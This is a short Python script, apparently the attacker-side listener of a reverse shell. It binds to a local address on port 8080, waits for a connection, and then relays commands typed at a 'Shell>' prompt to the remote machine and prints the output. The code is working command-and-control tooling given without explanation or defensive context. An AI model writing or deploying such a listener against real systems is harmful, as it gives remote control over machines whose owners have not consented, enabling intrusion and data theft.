import socket

def connect():
    s = socket.socket()
    s.bind(("192.168.68.108", 8080))
    s.listen(1)   
    conn, addr = s.accept() 

    while True:

        command = input("Shell> ")

        if 'exit' in command:  
            conn.send('exit'.encode())
            conn.close()
            break

        else:
            conn.send(command.encode())  
            print(conn.recv(1024).decode())  

def main():
    connect()

main()

